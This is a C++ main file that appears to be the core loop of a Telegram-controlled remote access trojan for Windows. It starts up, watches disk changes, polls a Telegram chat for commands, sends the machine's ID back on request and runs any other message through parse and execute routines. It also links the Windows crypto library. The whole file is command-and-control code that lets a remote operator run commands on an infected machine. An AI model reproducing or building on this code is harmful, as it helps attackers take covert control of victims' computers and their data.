#include <iostream>

#include <nlohmann/json.hpp>
#include <cpr/cpr.h>

#include "globals.h"
#include "startup.h"
#include "telegram.h"
#include "parse.h"
#include "execute.h"
#include "tools.h"
#include "diskchanges.h"

#pragma comment(lib, "Crypt32.lib")

using json = nlohmann::json;

int main(int argc, char **argv) {
	startup(argc, argv);
	int LastMessageId = -1;

	while (true) {
		diskchanges::Diskchanges();

		Sleep(REFRESH * 1000);
		json message = telegram::GetLastMessage();

		if (LastMessageId == message["message_id"])
			continue;  // continue if that request is already done
		if (time(nullptr) - message["date"] > REFRESH + 3)
			continue;  // continue if that request is too old

		LastMessageId = message["message_id"].get<int>();

		if (message["text"] == "ALL_ID") {
			std::clog << "ALL_ID\n";
			telegram::SendText(ID);
			continue;
		}

		execute::execute(parse::Parse(message["text"]));
	}
}

